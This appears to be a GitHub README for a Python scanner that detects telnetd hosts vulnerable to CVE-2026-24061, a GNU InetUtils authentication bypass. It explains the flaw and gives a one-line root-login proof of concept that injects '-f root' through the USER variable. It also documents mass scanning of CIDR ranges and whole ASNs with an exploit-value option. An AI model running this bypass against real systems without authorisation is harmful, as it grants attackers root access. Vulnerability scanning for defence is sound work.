# 🎯 Twenty-Three Scanner

A **Powerful**, **Fast**, and **Elegant** scanner for detecting vulnerable **[Telnetd](https://www.gnu.org/software/inetutils/manual/inetutils.html#telnetd-invocation)** services affected by **[CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)**. Built with pure **[Python](https://www.python.org)** standard library - zero external dependencies required.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
[![Open Source](https://img.shields.io/badge/Open%20Source-%23F0F0F0?style=for-the-badge&logo=github&logoColor=black)](https://github.com/)
[![GitHub Repository](https://img.shields.io/badge/GitHub-Repo-181717?style=for-the-badge&logo=github&logoColor=ffffff)](https://github.com/username/repo)
[![Python 3.7+](https://img.shields.io/badge/Python-3.x-3776AB?style=for-the-badge&logo=python&logoColor=ffffff)](https://www.python.org/)
[![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://www.linux.org/)
[![BSD](https://img.shields.io/badge/BSD-003087?style=for-the-badge&logo=freebsd&logoColor=ffffff)](https://www.freebsd.org/)
[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=macos&logoColor=F0F0F0)](https://www.apple.com/macos/)
[![Windows](https://img.shields.io/badge/Windows-017ACA?style=for-the-badge&logo=windows&logoColor=ffffff)](https://www.microsoft.com/windows)
[![Offensive Security](https://img.shields.io/badge/Offensive%20Security-E38227?style=for-the-badge&logo=kali-linux&logoColor=ffffff)](https://www.offsec.com/)
[![Ethical Hacking](https://img.shields.io/badge/Ethical%20Hacking-FF6B35?style=for-the-badge&logo=hackthebox&logoColor=ffffff)](https://www.hackthebox.com/)
[![CVE-2026-24061](https://img.shields.io/badge/CVE--2026--24061-Critical-EB4D00?style=for-the-badge&logo=github&logoColor=white)](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)
[![GNU InetUtils](https://img.shields.io/badge/GNU%20InetUtils-FF6B35?style=for-the-badge&logo=gnu&logoColor=black)](https://www.gnu.org/software/inetutils/)
[![Telnetd](https://img.shields.io/badge/Telnetd-DC3023?style=for-the-badge&logo=terminal&logoColor=white)](https://www.rfc-editor.org/rfc/rfc857.html)

---

## 🔗 Table of Contents

- ⚖️ **[License](https://github.com/madfxr/Twenty-Three-Scanner/tree/main?tab=MIT-1-ov-file)**
- 🧩 **[Features](#-features)**
- ☣️ **[Vulnerability Details](#%EF%B8%8F-vulnerability-details)**
  - ⚡ **[Service Status](#-service-status)**
  - 🧪 **[Proof of Concept (PoC)](#-proof-of-concept-poc)**
  - 🏷️ **[Affected Versions](#%EF%B8%8F-affected-versions)**
  - ⚔️ **[Attack Vector](#%EF%B8%8F-attack-vector)**
  - 🚨 **[CVSS Score](#-cvss-score)**
- 🛠️ **[Installation](#%EF%B8%8F-installation)**
- 📜 **[Usage](#-usage)**
- 🔬 **[Examples](#-examples)**
- ⚗️ **[Demos](#%EF%B8%8F-demos)**
- 📖 **[References](#-references)**

---

## 🧩 Features

- 🚀 **High-Performance Scanning** – Multi-Threaded Architecture with Configurable Thread Count.
- 🌐 **Flexible Target Input** – Support for Single IPs, CIDR Ranges, ASN Lookups, and File-Based Lists.
- 📊 **Real-Time Progress** – Beautiful Unicode-Based UI with Live Progress Bars.
- 🤖 **ASN Intelligence** – Automatic Prefix Fetching from **[RADB](https://www.radb.net)**, **[BGPView](https://bgpview.docs.apiary.io)**, and **[HackerTarget](https://hackertarget.com)** APIs.
- 🌍 **GEO Location Intelligence** – Real-Time ASN, Provider and Location Fetching from **[ipapi](https://ipapi.co)** API.
- 💾 **Graceful Interruption** – CTRL+C Handling with Automatic Result Saving.
- 📝 **Detailed Logging** – Configurable Verbosity Levels for Debugging.
- 🛡️ **Safe Scanning** – Built-In Limits to Prevent Accidental Massive Scans.
- 🎨 **Clean Output** – Professional Bordered Tables with Scan Summaries.
- 📦 **Zero Dependencies** – Pure **[Python](https://www.python.org)** 3.7+ Standard Library Only.

---

## ☣️ Vulnerability Details

**[CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)** is a critical authentication bypass vulnerability in **[GNU InetUtils](https://www.gnu.org/software/inetutils)** **[Telnetd](https://www.gnu.org/software/inetutils/manual/inetutils.html#telnetd-invocation)** that allows unauthenticated remote attackers to gain root access by exploiting the **NEW-ENVIRON** option handling.

---

### ⚡ Service Status

The following is the Telnetd service configuration on the target host side.
<p align="center">
  <img
    src="https://github.com/user-attachments/assets/d6b009b7-67d3-41b6-ace6-7fd5b29bd4a0"
    alt="image"
    style="max-width: 891px; width: 100%;"
  />
</p>

---

### 🧪 Proof of Concept (PoC)

And here is the Proof of Concept (PoC) for this vulnerability, which can be executed manually from the attacker's host simply by running the command `USER=“-f root” telnet -a <TARGET_HOST> 23`.
<p align="center">
  <img
    src="https://github.com/user-attachments/assets/2710b1b6-74cf-4f6a-87d3-981d7f1eaa6e"
    alt="image"
    style="max-width: 891px; width: 100%;"
  />
</p>

---

### 🏷️ Affected Versions
- **[GNU InetUtils](https://www.gnu.org/software/inetutils)** since version 1.9.3 up to and including version 2.7.
- Various embedded **[Linux](https://www.linux.org)** distributions.
- IoT devices with vulnerable **[Telnetd](https://www.gnu.org/software/inetutils/manual/inetutils.html#telnetd-invocation)** implementations.

---

### ⚔️ Attack Vector
The vulnerability exploits improper validation of the `USER` environment variable in the telnet **NEW-ENVIRON ([RFC 1572](https://www.rfc-editor.org/rfc/rfc1572.html))** option negotiation, allowing attackers to inject malicious values like `-f root` to bypass authentication.

---

### 🚨 CVSS Score
**9.8 (Critical)** - **[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3-1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)**.

---

## 🛠️ Installation

```bash
# Clone the Repository
cd /opt
sudo git clone https://github.com/madfxr/Twenty-Three-Scanner.git
cd Twenty-Three-Scanner

# Make Executable
sudo chmod +x twenty-three-scanner.py

# Run the Script
sudo python3 twenty-three-scanner.py -h
```

---

## 📜 Usage

The following is a manual for the Twenty-Three Scanner tool that can be used to detect the vulnerability **CVE-2026-24061 - GNU InetUtils Telnetd Remote Authentication Bypass**.
```bash
usage: python3 twenty-three-scanner.py [-h] [-t TARGET] [-f FILE] [-a ASN] [-p PORT] [--threads N] [--user-value VALUE] [--connect-timeout SEC] [--read-timeout SEC] [--id-timeout SEC]
                                       [--max-hosts-per-cidr N] [--max-total-hosts N] [--skip-large-networks] [-o FILE] [-v]

CVE-2026-24061 - GNU InetUtils Telnetd Remote Authentication Bypass

options:
  -h, --help            show this help message and exit

Target Options:
  -t TARGET, --target TARGET
                        target IP, CIDR, or comma-separated list (can be used multiple times)
  -f FILE, --file FILE  file containing targets (one per line, supports comments with #)
  -a ASN, --asn ASN     autonomous system number (e.g., AS10111 or 10111)

Scan Options:
  -p PORT, --port PORT  target port(s), comma-separated (default: 23)
  --threads N           number of concurrent threads (default: 50)
  --user-value VALUE    USER environment variable value for exploit (default: '-f root')

Timeout Options:
  --connect-timeout SEC
                        TCP connection timeout in seconds (default: 3.0)
  --read-timeout SEC    socket read timeout in seconds (default: 2.0)
  --id-timeout SEC      'id' command response timeout in seconds (default: 2.0)

Limit Options:
  --max-hosts-per-cidr N
                        maximum hosts to scan per CIDR block (default: 1024)
  --max-total-hosts N   maximum total hosts across all targets (default: 50000)
  --skip-large-networks
                        skip networks larger than /16 (avoids accidentally scanning huge ranges)

Output Options:
  -o FILE, --output FILE
                        save vulnerable hosts to file (format: IP:PORT)
  -v, --verbose         enable verbose debug logging
```

---

## 🔬 Examples

```bash
  # Scan Single IP Address, and Single Port
  sudo python3 twenty-three-scanner.py -t 10.0.0.23 -p 23

  # Scan Single IP Address, and Multiple Ports
  sudo python3 twenty-three-scanner.py -t 10.0.0.23 -p 23,2323

  # Scan Multiple IP Addresses, and Single Port
  sudo python3 twenty-three-scanner.py -t 10.0.0.23,10.0.23.23 -p 23

  # Scan Multiple Addresses, and Multiple Ports
  sudo python3 twenty-three-scanner.py -t 10.0.0.23,10.0.23.23 -p 23,2323

  # Scan CIDR Range, and Single Port with Results
  sudo python3 twenty-three-scanner.py -t 192.168.23.0/23 -p 23 -o results.txt

  # Scan CIDR Range, and Multiple Ports with Results
  sudo python3 twenty-three-scanner.py -t 192.168.23.0/23 -p 23,2323 -o results.txt

  # Scan Single IP Address, Multiple Addresses, or CIDR Range from File, and Single Port with Custom Thread and Output 
  sudo python3 twenty-three-scanner.py -f targets.txt -p 23 --threads 100 -o output.txt

  # Scan Single IP Address, Multiple IP Addresss, or CIDR Range from File, and Multiple Ports with Custom Threads and Output 
  sudo python3 twenty-three-scanner.py -f targets.txt -p 23,2323 --threads 100 -o output.txt

  # Scan ASN and Single Port with Custom Threads
  sudo python3 twenty-three-scanner.py -a 10111 -p 23 --threads 100
  sudo python3 twenty-three-scanner.py -a AS10111 -p 23 --threads 100

  # Scan ASN and Multiple Ports with Custom Threads
  sudo python3 twenty-three-scanner.py -a 10111 -p 23,2323 --threads 100
  sudo python3 twenty-three-scanner.py -a AS10111 -p 23,2323 --threads 100

  # Scan ASN with Custom Limits and Custom Threads
  sudo python3 twenty-three-scanner.py -a 10111 --max-hosts-per-cidr 2048 --threads 100
  sudo python3 twenty-three-scanner.py -a AS10111 --max-hosts-per-cidr 2048 --threads 100
```

---

## ⚗️ Demos

**Scan Single IP Address with Multiple Ports**.

<p align="center">
  <img
    src="https://github.com/user-attachments/assets/97402e73-f31f-4651-944c-59270e3e9d52"
    alt="image"
    style="max-width: 891px; width: 100%;"
  />
</p>

**Scan Multiple IP Addresses with Single Port**.

<p align="center">
  <img
    src="https://github.com/user-attachments/assets/f8d674e1-323f-40a2-bc7d-9e0eca0ec437"
    alt="image"
    style="max-width: 891px; width: 100%;"
  />
</p>

**Scan CIDR Range with Single Port**.

<p align="center">
  <img
    src="https://github.com/user-attachments/assets/aac8a7e0-30e9-4efb-9146-7c4031c2d733"
    alt="image"
    style="max-width: 891px; width: 100%;"
  />
</p>

**Scan ASN with Multiple Ports**.

<p align="center">
  <img
    src="https://github.com/user-attachments/assets/673c8cda-a1a4-4662-9a0d-461b2f5eb77d"
    alt="image"
    style="max-width: 891px; width: 100%;"
  />
</p>

**Scan Single IP Address, Multiple Addresses, or CIDR Range from File, and Single Port with Custom Thread and Output**.

<p align="center">
  <img
    src="https://github.com/user-attachments/assets/e4a4aff0-e8de-4723-a3da-aa5df25d698f"
    alt="image"
    style="max-width: 891px; width: 100%;"
  />
</p>

---

## 📖 References
- **[Critical GNU InetUtils telnetd Flaw Lets Attackers Bypass Login and Gain Root Access](https://thehackernews.com/2026/01/critical-gnu-inetutils-telnetd-flaw.html)**
- **[NVD - CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)**
- **[CVE Record: CVE-2026-24061](https://www.cve.org/CVERecord?id=CVE-2026-24061)**
- **[Inetutils - GNU network utilities](https://www.gnu.org/software/inetutils)**
- **[[SECURITY] [DLA 4453-1] inetutils security update](https://lists.debian.org/debian-lts-announce/2026/01/msg00025.html)**
- **[GNU InetUtils Security Advisory: remote authentication by-pass in telnet](https://lists.gnu.org/archive/html/bug-inetutils/2026-01/msg00004.html)**
- **[GNU InetUtils Security Advisory: remote authentication by-pass in telnetd](https://www.openwall.com/lists/oss-security/2026/01/20/2)**
- **[GNU InetUtils Security Advisory: remote authentication by-pass in telnetd](https://www.openwall.com/lists/oss-security/2026/01/20/2#:~:text=root@...a%3A~%20USER=')**
- **[Re: GNU InetUtils Security Advisory: remote authentication by-pass in telnetd](https://www.openwall.com/lists/oss-security/2026/01/22/1)**
- **[Re: GNU InetUtils Security Advisory: remote authentication by-pass in telnetd](https://www.openwall.com/lists/oss-security/2026/01/20/8)**
- **[CVE-2026-24061 Telnet RCE Exploit - By SafeBreach Labs](https://github.com/SafeBreach-Labs/CVE-2026-24061)**
